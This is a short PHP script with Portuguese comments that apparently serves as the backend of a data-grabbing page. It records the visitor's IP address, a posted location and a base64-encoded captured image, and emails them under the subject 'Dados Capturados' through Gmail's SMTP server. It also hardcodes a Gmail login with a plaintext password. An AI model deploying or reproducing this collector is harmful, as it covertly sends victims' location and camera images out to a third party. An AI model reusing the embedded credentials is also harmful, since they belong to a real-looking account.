<?php
require 'PHPMailer/PHPMailerAutoload.php';
// Caminho para a biblioteca PHPMailer

// Obtém o endereço IP do usuário
$ip = $_SERVER['REMOTE_ADDR'];

// Retorna o endereço IP
echo $ip;

// Configurações do servidor SMTP do Gmail
$mail = new PHPMailer;
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->Port = 587; // Porta SMTP do Gmail
$mail->SMTPSecure = 'tls'; // Ou 'ssl'
$mail->SMTPAuth = true;
$mail->Username = 'jetad062@gmail.com'; // Seu endereço de e-mail do Gmail
$mail->Password = '040507Meuc@belo'; // Sua senha do Gmail

// Configurações do e-mail
$mail->setFrom('seu_email@gmail.com', 'Seu Nome');
$mail->addAddress('email_destino@example.com', 'Nome do Destinatário'); // E-mail e nome do destinatário
$mail->Subject = 'Dados Capturados';
$mail->Body = 'Aqui estão os dados capturados:' . PHP_EOL .
    'Localização: ' . $_POST['localizacao'] . PHP_EOL .
    'Endereço IP: ' . $_SERVER['REMOTE_ADDR']; // Adicione mais dados se necessário

// Anexar a imagem capturada (se existir)
if (!empty($_POST['imagem'])) {
    $mail->addStringAttachment(base64_decode($_POST['imagem']), 'imagem_capturada.png', 'base64', 'image/png');
}

// Envie o e-mail
if (!$mail->send()) {
    echo 'Erro ao enviar e-mail: ' . $mail->ErrorInfo;
} else {
    echo 'E-mail enviado com sucesso!';
}
?>
